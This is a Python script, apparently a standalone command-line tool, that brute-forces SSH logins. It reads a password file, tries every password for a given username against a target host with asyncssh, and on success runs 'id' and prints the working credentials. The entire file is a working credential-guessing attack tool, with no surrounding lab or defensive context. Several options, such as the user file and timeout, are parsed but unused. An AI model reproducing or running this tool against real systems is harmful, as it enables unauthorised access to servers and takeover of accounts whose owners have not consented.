#import paramiko
import time
from colorama import init, Fore
import argparse
import asyncio
import asyncssh

class TimeoutException(Exception):
    pass

async def is_host_alive(host, port, duration=3, delay=1.5):
    tmax = time.time() + duration
    while time.time() < tmax:
        try:
            _reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=3)
            writer.close()
            await writer.wait_closed()
            return True
        except:
            if delay:
                await asyncio.sleep(delay)
    return False

async def conn(semaphore, host, port, username, password):
    async with semaphore:
        try:
            async with asyncssh.connect(
                                                host=host, 
                                                port=port,
                                                username=username, 
                                                password=password) as conn:
                        result = await conn.run('id', check=True)
                        print(f"{GREEN}[+] Found combo:\n\tHost: {host}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
                        print(f"{GREEN}\n\t{result.stdout}{RESET}")

        except (OSError, asyncssh.Error) as exc:
            print(f"{RED}[!] {exc} for {username}:{password}@{host} {RESET}")

        except asyncssh.misc.PermissionDenied:
            print(f"{RED}[!] Permission denied for {username}:{password}@{host} {RESET}")


async def main(args):

    host = args.ip.split(':')[0]
    port = int(args.ip.split(':')[1])

    is_alive = await is_host_alive(host,port)
    if(is_alive != True):
        raise TimeoutException

    semaphore = asyncio.Semaphore(args.threads)

    tasks = []
    pass_file = open(args.pass_file, "r")
    for line in pass_file:
        tasks.append(conn(semaphore, host, port, args.username, line.replace("\n","")))

    await asyncio.wait(tasks)


# initialize colorama
init()
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE



if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="ip",help="ip address\nExample: 127.0.0.1:22")
    parser.add_argument("-U", "--user-file", dest="user_file", help="File that contains usernames")
    parser.add_argument("-u", "--user", dest="username",help="Username")
    parser.add_argument("-P", "--pass-file", dest="pass_file", help="File that contains passwords")
    parser.add_argument("-p", "--password", dest="password",help="Password")
    parser.add_argument("-to", "--timeout", dest="timeout",help="Timeout", default=3)
    parser.add_argument("-t", "--threads", dest="threads", help="Number of threads, \
                                                                default is 4, since its asynchronous\
                                                                its already fast so dont change it, it may not work properly",default=4)

    args = parser.parse_args()
    loop = asyncio.get_event_loop()

    try:
        loop.run_until_complete(main( args ))
    
    except TimeoutException:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {args.ip} is unreachable, timed out.{RESET}")
        loop.close()